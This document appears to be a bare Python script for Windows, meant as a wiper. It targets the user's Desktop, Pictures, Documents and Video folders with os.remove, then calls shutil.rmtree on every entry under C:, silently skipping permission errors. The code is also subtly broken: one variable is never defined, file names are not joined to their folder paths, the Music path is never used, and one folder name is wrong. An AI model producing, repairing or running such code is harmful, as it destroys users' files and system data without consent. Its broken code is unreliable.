import os,shutil

Desktop_Path = "C:" + os.sep + os.path.join(os.environ["HOMEPATH"], "Desktop")

Pictures_Path = "C:" + os.sep + os.path.join(os.environ["HOMEPATH"], "Pictures")

Document_Path = "C:" + os.sep + os.path.join(os.environ["HOMEPATH"], "Documents")

Music_Path = "C:" + os.sep + os.path.join(os.environ["HOMEPATH"], "Music")

Video_Path = "C:" + os.sep + os.path.join(os.environ["HOMEPATH"], "Video")



for File in os.listdir(Desktop_Path):
    try:
        os.remove(File)
    except PermissionError:
        pass

for File in os.listdir(Picture_File_Path):
    try:
        os.remove(File)
    except PermissionError:
        pass    

                                               
for File in os.listdir(Document_Path):
    try:
        os.remove(File)
    except PermissionError:
        pass


for File in os.listdir(Video_Path):
    try:
        os.remove(File)
    except PermissionError:
        pass

for File in os.listdir("C:"):
    try:
        shutil.rmtree(File)
    except PermissionError:
        pass
